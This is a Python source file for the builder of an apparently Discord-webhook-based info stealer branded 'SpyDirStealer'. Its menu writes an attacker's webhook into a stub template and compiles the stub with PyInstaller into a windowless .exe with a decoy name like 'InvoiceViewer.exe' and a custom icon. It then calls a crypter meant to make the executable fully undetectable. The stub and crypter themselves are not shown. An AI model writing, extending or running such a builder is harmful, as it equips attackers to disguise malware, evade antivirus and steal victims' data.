import os
import time
import subprocess
import sys

WEBHOOK_FILE = "webhook.txt"
STUB_TEMPLATE = "stub.py"
BUILD_FOLDER = "build"

# Terminal style
def type_out(text, delay=0.005):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    print()

def banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print("\033[92m")  # green
    type_out(r'''
███████╗██████╗ ██╗   ██╗██████╗ ██╗██████╗ ███████╗████████╗███████╗ █████╗ ██╗     ███████╗██████╗ 
██╔════╝██╔══██╗╚██╗ ██╔╝██╔══██╗██║██╔══██╗██╔════╝╚══██╔══╝██╔════╝██╔══██╗██║     ██╔════╝██╔══██╗
███████╗██████╔╝ ╚████╔╝ ██║  ██║██║██████╔╝███████╗   ██║   █████╗  ███████║██║     █████╗  ██████╔╝
╚════██║██╔═══╝   ╚██╔╝  ██║  ██║██║██╔══██╗╚════██║   ██║   ██╔══╝  ██╔══██║██║     ██╔══╝  ██╔══██╗
███████║██║        ██║   ██████╔╝██║██║  ██║███████║   ██║   ███████╗██║  ██║███████╗███████╗██║  ██║
╚══════╝╚═╝        ╚═╝   ╚═════╝ ╚═╝╚═╝  ╚═╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝
                                                                                                     

        [ + ] Developed by AnonSpyDir
    ''', delay=0.0008)

    status = 'Injected ✅' if os.path.exists(WEBHOOK_FILE) else 'Not Injected ❌'
    print(f"\n[ 🔗 ] Webhook Status: {status}")
    print("\n[ 1️⃣ ] Inject Webhook")
    print("[ 2️⃣ ] Build Stub (.exe only)")
    print("[ 3️⃣ ] Stub Cryptor (FUD a .exe)")
    print("[ 4️⃣ ] Exit\n\033[0m")  # reset

def inject_webhook():
    print("\n\033[96m[ ? ] Enter Discord Webhook URL:\033[0m ", end="")
    webhook = input().strip()
    with open(WEBHOOK_FILE, "w", encoding="utf-8") as f:
        f.write(webhook)
    print("\033[92m[ + ] Webhook injected successfully!\033[0m")
    time.sleep(1)

def build_stub():
    if not os.path.exists(WEBHOOK_FILE):
        print("\033[91m[ ! ] No webhook injected. Inject it first.\033[0m")
        time.sleep(2)
        return

    with open(WEBHOOK_FILE, "r", encoding="utf-8") as f:
        webhook = f.read().strip()

    if not os.path.exists(STUB_TEMPLATE):
        print(f"\033[91m[ ! ] Missing '{STUB_TEMPLATE}'.\033[0m")
        time.sleep(2)
        return

    with open(STUB_TEMPLATE, "r", encoding="utf-8") as stub_file:
        original_code = stub_file.read()

    modified_code = original_code.replace("WEBHOOK = ''", f"WEBHOOK = '{webhook}'")

    with open(STUB_TEMPLATE, "w", encoding="utf-8") as stub_file:
        stub_file.write(modified_code)

    exe_name = input("\n\033[96m[ ? ] Name for .exe (e.g. InvoiceViewer.exe):\033[0m ").strip()
    if not exe_name.endswith(".exe"):
        exe_name += ".exe"

    icon_path = input("\033[96m[ ? ] Path to .ico file (optional):\033[0m ").strip()
    icon_option = ["--icon", icon_path] if icon_path else []

    print("\033[93m[ * ] Building executable with PyInstaller...\033[0m")
    os.makedirs(BUILD_FOLDER, exist_ok=True)

    try:
        subprocess.run([
            "pyinstaller",
            "--onefile",
            "--noconsole",
            "--name", exe_name.replace(".exe", ""),
            "--distpath", BUILD_FOLDER,
            "--workpath", "temp",
            "--specpath", "temp",
            *icon_option,
            STUB_TEMPLATE
        ], check=True)
        print(f"\033[92m[ ✅ ] Executable created: {BUILD_FOLDER}/{exe_name}\033[0m")
    except subprocess.CalledProcessError as e:
        print("\033[91m[ ❌ ] PyInstaller failed.\033[0m", e)

    with open(STUB_TEMPLATE, "w", encoding="utf-8") as stub_file:
        stub_file.write(original_code)

    time.sleep(2)

def run_crypter():
    print("\n\033[96m[ ? ] Enter path to the file you want to crypt (e.g., stub.exe):\033[0m ", end="")
    target_path = input().strip()

    if not os.path.isfile(target_path):
        print("\033[91m[ ! ] File not found. Please check the path.\033[0m")
        time.sleep(2)
        return

    try:
        subprocess.run(["python", "crypter.py", target_path], check=True)
        print("\033[92m[ ✅ ] Crypting complete!\033[0m")
    except subprocess.CalledProcessError as e:
        print(f"\033[91m[ ❌ ] Crypter failed: {e}\033[0m")
    time.sleep(2)

def main():
    while True:
        banner()
        choice = input("\033[96m[ ? ] Select an option:\033[0m ").strip()
        if choice == "1":
            inject_webhook()
        elif choice == "2":
            build_stub()
        elif choice == "3":
            run_crypter()
        elif choice == "4":
            print("\033[93m[ * ] Exiting...\033[0m")
            break
        else:
            print("\033[91m[ ! ] Invalid option\033[0m")
            time.sleep(1)

if __name__ == "__main__":
    main()
